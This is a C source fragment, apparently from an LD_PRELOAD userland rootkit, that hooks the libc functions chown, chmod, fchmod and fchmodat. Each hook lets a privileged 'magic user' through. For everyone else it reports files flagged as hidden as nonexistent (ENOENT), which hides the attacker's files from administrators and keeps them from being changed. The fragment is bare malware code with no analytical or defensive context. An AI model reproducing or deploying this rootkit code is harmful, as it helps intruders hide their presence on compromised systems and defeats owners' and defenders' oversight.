int chown(const char *pathname, uid_t owner, gid_t group){
    hook(o_chown,"chown");
    if(magic_user()) return o_chown(pathname,owner,group);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_chown(pathname,owner,group);
}
int chmod(const char *pathname, mode_t mode){
    hook(o_chmod,"chmod");
    if(magic_user()) return o_chmod(pathname,mode);
    if(hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_chmod(pathname,mode);
}
int fchmod(int fd, mode_t mode){
    hook(o_fchmod,"fchmod");
    if(magic_user()) return o_fchmod(fd,mode);
    if(hfxstat(fd)){ errno=ENOENT; return -1; }
    return o_fchmod(fd,mode);
}
int fchmodat(int dirfd, const char *pathname, mode_t mode, int flags){
    hook(o_fchmodat,"fchmodat");
    if(magic_user()) return o_fchmodat(dirfd,pathname,mode,flags);
    if(hfxstat(dirfd) || hxstat(pathname)){ errno=ENOENT; return -1; }
    return o_fchmodat(dirfd,pathname,mode,flags);
}
